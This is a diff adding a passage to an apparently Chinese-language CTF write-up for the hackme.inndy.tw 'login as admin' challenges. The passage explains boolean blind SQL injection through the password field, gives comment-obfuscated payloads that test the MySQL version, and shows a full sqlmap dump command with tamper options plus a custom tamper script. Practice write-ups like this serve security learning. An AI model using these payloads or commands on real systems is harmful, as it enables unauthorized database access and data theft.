@@ -179,3 +179,52 @@ bbb\'/**/UNION/**/SELECT/**/1,2,3,4#
 ```
 
 没有地方可以给 `union select` 注入返回数据。那么布尔盲注是怎么做到的呢？
+
+寻找常见的布尔盲注测试的 payload 可以发现，当密码字段如下时（判断 MySQL 大版本是否为 5）：
+
+```
+b\'/**/or/**/left(version(),1)=5#
+```
+
+可以登录。但如果稍作修改：
+
+```
+b\'/**/or/**/left(version(),1)=4#
+```
+
+就无法登录。换言之，我们做到了判断 MySQL 的大版本号。
+
+接下来呢？盲注自己弄真的太麻烦了，我又不想写脚本，所以就……`sqlmap` 吧。
+
+当然直接硬来肯定是不可以的，需要给 `sqlmap` 加一些参数指导，最终命令如下：
+
+```shell
+sqlmap -u https://hackme.inndy.tw/login1/ --data "name=guest&password=guest" -p password --random-agent --dbms=MySQL --tamper="my_tamper.py,escapequotes,space2comment" -v 3 --technique B --risk=3 --level=5 --string "are not" --dbs -D login_as_admin1 --columns -o --threads 10 --dump
+```
+
+其中：
+
+- `--random-agent`: 随机化 UA。`sqlmap` 默认 UA 直接暴露了自己是扫描器的事实，因为源代码中有 UA 过滤，所以加上了此参数。
+- `--technique B`: 要求只使用布尔盲注。
+- `--risk=3 --level=5`: 如果不用的话 `sqlmap` 不会测试 `OR boolean-based injection `。
+- `--string "are not"`: 指示布尔盲注时布尔值为真时页面拥有的字符串。
+- `-o --threads 10`: 优化运行速度（布尔盲注比较慢）。
+
+tamper `my_tamper.py` 内容如下：
+
+```python
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    replaces comment at end to #
+    """
+
+    return payload.replace("-- ", "#")
+```
+
+## 22: login as admin 3
+
+我们总算是逃脱了 SQL 注入的苦海😂。
+
